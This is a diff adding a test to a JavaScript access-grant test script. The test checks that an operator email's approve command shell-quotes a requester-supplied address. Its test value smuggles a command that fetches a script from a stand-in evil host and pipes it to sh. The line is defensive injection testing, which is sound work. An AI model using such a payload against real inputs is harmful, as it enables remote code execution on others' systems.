@@ -737,6 +737,16 @@ async function main() {
   try { grant('--email', asker, '--feature', 'ai_proxy', '--by', 'beta', '--notify') } catch (err) { badNotify = err }
   expect(badNotify?.status === 1, '--notify is share_publish only')
 
+  // The operator email's approve command quotes the requester-controlled
+  // address: pasted into a shell, it must stay one literal argument.
+  const hostile = "x;curl${IFS}evil.sh|sh@evil.example"
+  const shown = execFileSync('npx', ['tsx', '-e',
+    `import { grantCommand } from './src/mail/templates/access.ts'; process.stdout.write(grantCommand(${JSON.stringify(hostile)}))`,
+  ], { cwd: ROOT, encoding: 'utf8' })
+  const quotedArg = shown.match(/--email ('(?:[^']|'\\'')*')/)?.[1] ?? ''
+  const echoed = execFileSync('/bin/sh', ['-c', `printf %s ${quotedArg}`], { encoding: 'utf8' })
+  expect(echoed === hostile, 'approve command shell-quotes the requester address', shown)
+
   // An invited user is told they can publish (the check claims the invite).
   const preInvited = `preinvited-${stamp}@example.invalid`
   grant('--email', preInvited, '--feature', 'share_publish', '--by', 'beta')
